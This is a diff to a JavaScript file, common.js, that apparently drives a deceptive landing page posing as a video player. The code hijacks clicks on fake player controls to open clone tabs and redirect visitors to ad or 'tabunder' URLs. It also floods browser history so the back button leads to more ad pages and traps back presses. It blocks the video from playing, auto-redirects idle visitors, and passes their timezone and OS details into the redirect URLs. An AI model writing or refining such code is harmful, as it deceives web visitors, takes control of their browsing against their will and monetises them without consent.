@@ -1,14 +1,8 @@
-/* common.js — vanisher-style micro handoff (fixed v3)
-   v1:
-     - micro targets -> open CLONE tab, current tab redirects to TABUNDER (AFU)
-     - everything else -> MAIN EXIT (even before ready)
-   v2 (clone):
-     - ANY click anywhere -> MAIN EXIT (micro disabled)
-
+/* common.js — vanisher-style micro handoff (FINAL v4)
    Fixes:
-   - no visibilitychange dependency for dual-exit (redirect current immediately)
-   - reverse is armed via pushState trap on boot (no click-capture initBack that breaks first click)
-   - keep back.html stuffing only when we actually EXIT (main/micro/back/autoexit)
+   - Added setTimeout(40ms) to replaceTo when history is pushed. 
+     This prevents the browser from choking on simultaneous history+redirect actions.
+   - Used stopImmediatePropagation to kill video play attempts on exit click.
 */
 
 (() => {
@@ -20,11 +14,12 @@
   const safe = (fn) => { try { return fn(); } catch { return undefined; } };
   const err  = (...a) => safe(() => console.error(...a));
 
+  // Обычный редирект
   const replaceTo = (url) => {
     try { window.location.replace(url); } catch { window.location.href = url; }
   };
 
-  // Open immediately (popup rules). Navigates blank -> target.
+  // Открытие вкладки (popup safe)
   const openTab = (url) => {
     try {
       const w = window.open("about:blank", "_blank");
@@ -67,7 +62,6 @@
   const getTimezoneName = () => safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone) || "";
   const getTimezoneOffset = () => safe(() => new Date().getTimezoneOffset()) ?? 0;
 
-  // optional (do not block exits)
   const getOsVersion = async () => {
     try {
       const nav = navigator;
@@ -96,17 +90,15 @@
   };
 
   // ---------------------------
-  // Normalize APP_CONFIG
+  // Config
   // ---------------------------
   const normalizeConfig = (appCfg) => {
     if (!appCfg || typeof appCfg !== "object" || !appCfg.domain) return null;
-
     const cfg = { domain: appCfg.domain };
     const ensure = (name) => (cfg[name] ||= {});
 
     Object.entries(appCfg).forEach(([k, v]) => {
       if (v == null || v === "" || k === "domain") return;
-
       let m = k.match(/^([a-zA-Z0-9]+)_(currentTab|newTab)_(zoneId|url)$/);
       if (m) {
         const [, name, tab, field] = m;
@@ -115,14 +107,8 @@
         ex[tab][field] = v;
         return;
       }
-
       m = k.match(/^([a-zA-Z0-9]+)_(count|timeToRedirect|pageUrl)$/);
-      if (m) {
-        ensure(m[1])[m[2]] = v;
-        return;
-      }
-
-      // tabUnderClick_* by default = newTab
+      if (m) { ensure(m[1])[m[2]] = v; return; }
       m = k.match(/^([a-zA-Z0-9]+)_(zoneId|url)$/);
       if (m) {
         const [, name, field] = m;
@@ -132,37 +118,21 @@
         ex[tab][field] = v;
       }
     });
-
     return cfg;
   };
 
   // ---------------------------
-  // Fast AFU URL builder (no awaits)
+  // URL Builders
   // ---------------------------
   const buildExitQSFast = ({ zoneId }) => {
-    const ab2r =
-      IN.abtest ||
-      (typeof window.APP_CONFIG?.abtest !== "undefined" ? String(window.APP_CONFIG.abtest) : "");
-
+    const ab2r = IN.abtest || (typeof window.APP_CONFIG?.abtest !== "undefined" ? String(window.APP_CONFIG.abtest) : "");
     const base = {
-      ymid: IN.var_1 || IN.var || "",
-      var: IN.var_2 || IN.z || "",
-      var_3: IN.var_3 || "",
-      b: IN.b || "",
-      campaignid: IN.campaignid || "",
-      click_id: IN.s || "",
-      rhd: IN.rhd || "1",
-      os_version: osVersionCached || "",
-      btz: getTimezoneName(),
-      bto: String(getTimezoneOffset()),
-      cmeta: buildCmeta(),
-      pz: IN.pz || "",
-      tb: IN.tb || "",
-      tb_reverse: IN.tb_reverse || "",
-      ae: IN.ae || "",
-      ab2r,
+      ymid: IN.var_1 || IN.var || "", var: IN.var_2 || IN.z || "", var_3: IN.var_3 || "",
+      b: IN.b || "", campaignid: IN.campaignid || "", click_id: IN.s || "", rhd: IN.rhd || "1",
+      os_version: osVersionCached || "", btz: getTimezoneName(), bto: String(getTimezoneOffset()),
+      cmeta: buildCmeta(), pz: IN.pz || "", tb: IN.tb || "", tb_reverse: IN.tb_reverse || "",
+      ae: IN.ae || "", ab2r,
     };
-
     if (zoneId != null && String(zoneId) !== "") base.zoneid = String(zoneId);
     return qsFromObj(base);
   };
@@ -177,21 +147,17 @@
   };
 
   // ---------------------------
-  // Back (classic back.html)
+  // Back Logic
   // ---------------------------
   const pushBackStates = (url, count) => {
     try {
       const n = Math.max(0, parseInt(count, 10) || 0);
       const originalUrl = window.location.href;
-
       for (let i = 0; i < n; i++) {
         window.history.pushState(null, "Please wait...", url);
       }
-
       window.history.pushState(null, document.title, originalUrl);
-    } catch (e) {
-      err("Back pushState error:", e);
-    }
+    } catch (e) { err("Back pushState error:", e); }
   };
 
   const getDefaultBackHtmlUrl = () => {
@@ -205,27 +171,18 @@
   const initBackFast = (cfg) => {
     const b = cfg?.back?.currentTab;
     if (!b) return;
-
     const count = cfg.back?.count ?? 10;
     const pageUrl = cfg.back?.pageUrl || getDefaultBackHtmlUrl();
     const page = new URL(pageUrl, window.location.href);
-
     const qs = buildExitQSFast({ zoneId: b.zoneId });
-
-    // router params for your back.html
-    if (b.url) {
-      qs.set("url", String(b.url));
-    } else {
-      qs.set("z", String(b.zoneId));
-      qs.set("domain", String(b.domain || cfg.domain || ""));
-    }
-
+    if (b.url) qs.set("url", String(b.url));
+    else { qs.set("z", String(b.zoneId)); qs.set("domain", String(b.domain || cfg.domain || "")); }
     page.search = qs.toString();
     pushBackStates(page.toString(), count);
   };
 
   // ---------------------------
-  // Exits (fast, no visibilitychange dependency)
+  // Exits (ГЛАВНЫЙ ФИКС ЗДЕСЬ)
   // ---------------------------
   const resolveUrlFast = (ex, cfg) => {
     if (!ex) return "";
@@ -237,22 +194,26 @@
   const runExitCurrentTabFast = (cfg, name, withBack = true) => {
     const ex = cfg?.[name]?.currentTab;
     if (!ex) return;
-
     const url = resolveUrlFast(ex, cfg);
     if (!url) return;
 
     safe(() => window.syncMetric?.({ event: name, exitZoneId: ex.zoneId || ex.url }));
-    if (withBack) initBackFast(cfg);
-    replaceTo(url);
+    
+    // --- ВАЖНО: Задержка 40мс перед редиректом ---
+    if (withBack) {
+        initBackFast(cfg);
+        // Даем браузеру переварить историю
+        setTimeout(() => replaceTo(url), 40); 
+    } else {
+        replaceTo(url);
+    }
   };
 
   const runExitDualTabsFast = (cfg, name, withBack = true) => {
     const ex = cfg?.[name];
     if (!ex) return;
-
     const ct = ex.currentTab;
     const nt = ex.newTab;
-
     const ctUrl = resolveUrlFast(ct, cfg);
     const ntUrl = resolveUrlFast(nt, cfg);
 
@@ -262,14 +223,16 @@
     });
 
     if (withBack) initBackFast(cfg);
-
     if (ntUrl) openTab(ntUrl);
-    if (ctUrl) replaceTo(ctUrl);
+    
+    if (ctUrl) {
+        // Тоже задержка для надежности
+        setTimeout(() => replaceTo(ctUrl), 40);
+    }
   };
 
   const run = (cfg, name) => {
     if (name === "tabUnderClick" && !cfg?.tabUnderClick) {
-      // fallback: if micro zone missing -> behave as mainExit
       return cfg?.mainExit?.newTab ? runExitDualTabsFast(cfg, "mainExit", true) : runExitCurrentTabFast(cfg, "mainExit", true);
     }
     if (cfg?.[name]?.newTab) return runExitDualTabsFast(cfg, name, true);
@@ -281,55 +244,34 @@
   // ---------------------------
   const initReverse = (cfg) => {
     if (!cfg?.reverse?.currentTab) return;
-
-    // trap state without changing URL
     safe(() => window.history.pushState({ __rev: 1 }, "", window.location.href));
-
     window.addEventListener("popstate", () => {
-      // back pressed -> reverse exit
       runExitCurrentTabFast(cfg, "reverse", false);
     });
   };
 
   const initAutoexit = (cfg) => {
     if (!cfg?.autoexit?.currentTab) return;
-
     const sec = parseInt(cfg.autoexit.timeToRedirect, 10) || 90;
-
     let armed = false;
     const trigger = () => {
-      if (document.visibilityState === "visible" && armed) {
-        runExitCurrentTabFast(cfg, "autoexit", true);
-      }
+      if (document.visibilityState === "visible" && armed) runExitCurrentTabFast(cfg, "autoexit", true);
     };
-
-    const timer = setTimeout(() => {
-      armed = true;
-      trigger();
-    }, sec * 1000);
-
-    const cancel = () => {
-      clearTimeout(timer);
-      document.removeEventListener("visibilitychange", trigger);
-    };
-
+    const timer = setTimeout(() => { armed = true; trigger(); }, sec * 1000);
+    const cancel = () => { clearTimeout(timer); document.removeEventListener("visibilitychange", trigger); };
     document.addEventListener("visibilitychange", trigger);
     ["mousemove", "click", "scroll"].forEach(ev => document.addEventListener(ev, cancel, { once: true }));
   };
 
-  // ---------------------------
-  // READY flag (kept for debug; mainExit works even before ready)
-  // ---------------------------
   const isPlayerReady = () => {
     const btn = document.querySelector(".xh-main-play-trigger");
     return !!(btn && btn.classList.contains("ready"));
   };
 
   // ---------------------------
-  // MICRO handoff (v1 only)
+  // Micro Handoff
   // ---------------------------
   const MICRO_DONE_KEY = "__micro_done";
-
   const buildCloneUrl = () => {
     const u = new URL(window.location.href);
     u.searchParams.set(CLONE_PARAM, "1");
@@ -339,115 +281,90 @@
 
   const runMicroHandoff = (cfg) => {
     if (isClone) return;
-
-    if (safe(() => sessionStorage.getItem(MICRO_DONE_KEY)) === "1") {
-      return run(cfg, "mainExit");
-    }
+    if (safe(() => sessionStorage.getItem(MICRO_DONE_KEY)) === "1") return run(cfg, "mainExit");
     safe(() => sessionStorage.setItem(MICRO_DONE_KEY, "1"));
 
-    // open clone tab immediately
     const cloneUrl = buildCloneUrl();
     safe(() => window.syncMetric?.({ event: "micro_open_clone" }));
     openTab(cloneUrl);
 
-    // redirect current to TABUNDER immediately (with back stuffing)
     const ex = cfg?.tabUnderClick?.newTab || cfg?.tabUnderClick?.currentTab;
     const monetUrl = resolveUrlFast(ex, cfg);
-
     if (monetUrl) {
       safe(() => window.syncMetric?.({ event: "tabUnderClick" }));
       initBackFast(cfg);
-      replaceTo(monetUrl);
+      setTimeout(() => replaceTo(monetUrl), 40); // Timeout здесь тоже
     } else {
       run(cfg, "mainExit");
     }
   };
 
   // ---------------------------
-  // Click map (your data-target)
+  // Click Map (СБОР СОБЫТИЙ И БЛОКИРОВКА ВИДЕО)
   // ---------------------------
   const initClickMap = (cfg) => {
     const fired = { mainExit: false, back: false };
+    const microTargets = new Set(["timeline", "play_pause", "mute_unmute", "settings", "fullscreen", "pip_top", "pip_bottom"]);
 
-    const microTargets = new Set([
-      "timeline",
-      "play_pause",
-      "mute_unmute",
-      "settings",
-      "fullscreen",
-      "pip_top",
-      "pip_bottom",
-    ]);
-
+    // useCapture = true — мы ловим событие ДО того, как оно дойдет до видео
     document.addEventListener("click", (e) => {
       const zone = e.target?.closest?.("[data-target]");
       const t = zone?.getAttribute("data-target") || "";
 
-      // Back UI button
+      // Back Button
       if (t === "back_button") {
         if (fired.back) return;
         fired.back = true;
-        e.preventDefault();
-        e.stopPropagation();
+        // Убиваем остальные обработчики
+        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
         runExitCurrentTabFast(cfg, "back", true);
         return;
       }
 
-      // Clone: any click -> mainExit
+      // Clone -> MainExit
       if (isClone) {
         if (fired.mainExit) return;
         fired.mainExit = true;
-        e.preventDefault();
-        e.stopPropagation();
+        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
         run(cfg, "mainExit");
         return;
       }
 
-      // Micro -> micro handoff (works even before ready)
+      // Micro
       if (microTargets.has(t)) {
-        e.preventDefault();
-        e.stopPropagation();
+        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
         runMicroHandoff(cfg);
         return;
       }
 
-      // Everything else -> mainExit (IMPORTANT: even before ready)
+      // Main Exit (Любой другой клик)
       if (fired.mainExit) return;
       fired.mainExit = true;
-      e.preventDefault();
+      
+      // БЛОКИРУЕМ ЗАПУСК ВИДЕО
+      e.preventDefault(); 
       e.stopPropagation();
+      e.stopImmediatePropagation(); 
+
       run(cfg, "mainExit");
-    }, true);
+    }, true); 
   };
 
-  // ---------------------------
-  // Boot
-  // ---------------------------
   const boot = () => {
     if (typeof window.APP_CONFIG === "undefined") {
       document.body.innerHTML = "<p style='color:#fff;padding:12px'>MISSING APP_CONFIG</p>";
       return;
     }
-
     const cfg = normalizeConfig(window.APP_CONFIG);
     if (!cfg) return;
 
     window.LANDING_EXITS = {
-      cfg,
-      run: (name) => run(cfg, name),
-      initBack: () => initBackFast(cfg),
-      microHandoff: () => runMicroHandoff(cfg),
-      isPlayerReady,
+      cfg, run: (name) => run(cfg, name), initBack: () => initBackFast(cfg),
+      microHandoff: () => runMicroHandoff(cfg), isPlayerReady,
     };
-
-    initClickMap(cfg);
-    initAutoexit(cfg);
-    initReverse(cfg);
+    initClickMap(cfg); initAutoexit(cfg); initReverse(cfg);
   };
 
-  if (document.readyState === "loading") {
-    document.addEventListener("DOMContentLoaded", boot);
-  } else {
-    boot();
-  }
+  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
+  else boot();
 })();
